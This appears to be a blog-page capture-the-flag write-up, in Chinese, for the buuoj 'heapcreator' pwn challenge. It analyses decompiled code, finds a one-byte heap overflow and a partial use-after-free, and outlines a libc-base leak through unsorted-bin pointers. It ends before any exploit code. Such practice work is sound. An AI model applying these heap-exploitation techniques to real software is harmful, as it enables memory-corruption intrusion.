@@ -1,0 +1,581 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="writeup" />
+
+
+<link rel="canonical" href="http://example.com/2022/03/20/buuoj-heapcreator/">
+
+
+
+  <title>
+buuoj_heapcreator - pwn |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">buuoj_heapcreator
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-03-20 23:59:28">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-03-20T23:59:28+08:00">2022-03-20</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>13k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>12 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/buuoj-heapcreator/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="这次刷题记录开始着重整理下在glibc-223下的一些利用姿势"><a class="markdownIt-Anchor" href="#这次刷题记录开始着重整理下在glibc-223下的一些利用姿势">#</a> 这次刷题记录开始着重整理下在 Glibc-2.23 下的一些利用姿势</h2>
+<p>说明下 buuoj 的一些不好的地方，buuoj 基本不会给 libc, 而有些没有后门的程序，往往需要去泄露 libc 的基地址，但是最近的一些题目很孬去匹配到正确的版本，我也就不清楚是什么问题了。这里就不过多赘述了，而匹配 libc 就不作为本文的一个要点。我们只要在本地同通过测试就好了</p>
+<h2 id="浅析"><a class="markdownIt-Anchor" href="#浅析">#</a> 浅析</h2>
+<p>题目环境以及保护<br>
+ ubuntu16</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=heapcreator</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/buuoj/heapcreater/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">$ file heapcreator </span><br><span class="line">heapcreator: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">5e69111</span>eca74cba2fb372dfcd3a59f93ca58f858, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>程序呢并没有开启 full relro, 这里就首先反映到是不是可以修改函数的 got 表呢？根据题目描述，其实就已经断定了这是一个堆题。</p>
+<p>接下来我们就主要看看其逻辑思路了</p>
+<h3 id="main"><a class="markdownIt-Anchor" href="#main">#</a> main</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>经典的分支结构</p>
+<h3 id="menu"><a class="markdownIt-Anchor" href="#menu">#</a> MENU</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="creat"><a class="markdownIt-Anchor" href="#creat">#</a> Creat</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  trr *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;heaparray + i) = (trr *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v0 = *(&amp;heaparray + i);</span><br><span class="line">      v0-&gt;ptr = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(*(&amp;heaparray + i))-&gt;ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      (*(&amp;heaparray + i))-&gt;size = size;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input((*(&amp;heaparray + i))-&gt;ptr, size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">read_input</span><span class="params">(<span class="type">void</span> *a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看 creat 的时候，首先可以看看是否存在溢出的可能。但是这道题这里没有什么溢出的可能。但是可以修改堆块的 prev_size</p>
+<h3 id="edit"><a class="markdownIt-Anchor" href="#edit">#</a> Edit</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input((<span class="type">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr, (*(&amp;heaparray + v1))-&gt;size + <span class="string">&#x27;\x01&#x27;</span>);<span class="comment">// 1字节溢出</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是当我们看到 edit 函数的时候，但到了这里有一个非常显眼的 1 字节溢出，所以后续考虑 OFF_BY_ONE 攻击手法与其他手法配合使用</p>
+<h3 id="show"><a class="markdownIt-Anchor" href="#show">#</a> Show</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, (*(&amp;heaparray + v1))-&gt;size, (<span class="type">const</span> <span class="type">char</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br></pre></td></tr></table></figure>
+<p>show 这里也没有什么特殊的，</p>
+<h3 id="free"><a class="markdownIt-Anchor" href="#free">#</a> Free</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;                   <span class="comment">// 只清空了heaparray,结构体中指针未清空，</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>free 模块这里，其实仔细看，会发现虽然 free 后将 bss 段上的指针清空了，但是结构体的 ptr 成员并没有清空，但是这了 uaf 并不是很容易利用。因为 bss 段上的指针被清空了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trr</span>&#123;</span></span><br><span class="line">	<span class="type">size_t</span> size; 		<span class="comment">//记录大小</span></span><br><span class="line">	<span class="type">void</span> * ptr;			<span class="comment">//储存我们输入Content</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ss:<span class="number">00000000006020</span>A0 ; trr *heaparray</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0 heaparray       dq ?                    ; DATA XREF: create_heap+<span class="number">31</span>↑r</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0                                         ; create_heap+<span class="number">54</span>↑w ...</span><br><span class="line">.bss:<span class="number">00000000006020</span>A8                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>A9                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AA                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AB                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AC                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AD                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AE                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020</span>AF                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>0                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>1                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>2                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>3                 db    ? ;</span><br><span class="line">.bss:<span class="number">00000000006020B</span>4                 db    ? ;</span><br></pre></td></tr></table></figure>
+<p>题目大概就是这样，初步我们看到了一个 off_by_one 漏洞，以及一个不是很理想 UAF</p>
+<h2 id="pwning"><a class="markdownIt-Anchor" href="#pwning">#</a> pwning</h2>
+<h3 id="开始前的准备"><a class="markdownIt-Anchor" href="#开始前的准备">#</a> 开始前的准备</h3>
+<p>首先这个题并没有后门，那么我们就要去泄露 libc 的基地址。然后再去考虑其他的</p>
+<h3 id="leak-the-libc_base"><a class="markdownIt-Anchor" href="#leak-the-libc_base">#</a> leak the libc_base</h3>
+<p>这里我们关注到的是在申请到堆块之后，并没有对其进行初始化，只是对储存有 content 的堆块检查读入的数据是否为 0 字节，也就是说我们至少读入一个字节，不过因为使用的 read 函数，所以不会自动的添加换行符，但这无所谓，这里将一个比较常用的 unsortedbins 泄露基地址 main_arena. 当一个较大的 chunk 超过了 fastbins 的范围，就会被加入 unsortedbins 双链表中。其实，第一个堆块的 fd,bk 指针会指向 main_arena+x,。当我们再次申请到这个 chunk 时，其 fd,bk 指针不会被清空，只是会被我们输入的 content 覆盖。但是我们输入的 content 只检查了至少输入一个字节，而且允许我们输入’\x00’空字符。</p>
+<p>那么这里就有了完整的泄露的思路</p>
